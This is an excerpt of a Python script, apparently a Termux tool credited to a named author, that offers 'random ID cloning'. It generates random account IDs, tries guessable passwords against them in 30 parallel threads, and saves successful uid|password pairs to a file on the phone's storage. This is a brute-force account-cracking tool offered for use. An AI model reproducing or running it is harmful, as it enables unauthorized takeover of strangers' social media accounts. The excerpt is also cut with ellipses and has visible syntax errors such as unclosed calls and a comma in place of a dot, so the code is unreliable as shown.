...
sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛REEDAMPRS 🙂💗 \x07')

try:os.mkdir('/sdcard/PRS')
except:pass
...
\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : Reedam Thapa
 \033[1;97m[\033[1;92m•\033[1;97m] Facebook : https://www.facebook.com/profile.php?id=100093350370020&mibextid=zLoPMf
 \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : https://github.com/reedam
...
def menu():
    clear()
    print(f" \033[1;97m[\033[1;92m01\033[1;97m] RANDOM ID CLONING"
    print(f" \033[1;97m[\033[1;92m03\033[1;97m] \033[1;32mCONTACT DEVELOPER")
    linex()
    reedamprs = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option : "
        random_number()
    elif reedamprs in ['2','02']:
        os.system("xdg-open https://youtube.com/@MRTRICKERXYZ?si=OSGhb7VAn8a_QX1C")
        time.sleep(3)
        menu()
    elif reedamprs in ['3','03']:
...
def random_number():
    ...
    with ThreadPoolExecutor(max_workers=30) as XYZ:
        ...
        for xyz in idz:
            uid = code+xyz
            pww = [prs,uid] 
            PRS,submit(crack, uid, pww, total_idz)
    linex()
    ...
    try:
        for pw in pww:
            ...
            if "session_key" in po:
                ...
                open("/sdcard/reedamCP.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
